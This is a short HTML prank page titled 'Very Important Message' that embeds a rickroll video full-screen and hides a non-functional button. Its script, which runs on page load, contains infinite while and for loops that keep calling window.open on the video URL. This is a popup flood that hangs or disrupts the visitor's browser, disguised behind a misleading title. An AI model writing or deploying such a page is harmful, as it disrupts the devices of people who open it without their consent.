<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Very Important Message</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: black;
            overflow: hidden;
        }

        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
        }
    </style>
</head>

<body>
    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?si=vnTewkN-Kg1kRcV6" allow="autoplay; fullscreen"
        title="Very Serious Video" frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
    </iframe>
    <button style="display: none;" onclick="goFull()">WATCH</button>
    <script>
        const url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        function goFull() {
            const iframe = document.querySelector("iframe");
            if (iframe.requestFullscreen) {
                iframe.requestFullscreen();
            }
        }

        while (true) {
            window.open(url, "_blank");

        }
        for (; ;) {
            window.open(url, "_blank");
        }

    </script>
</body>

</html>
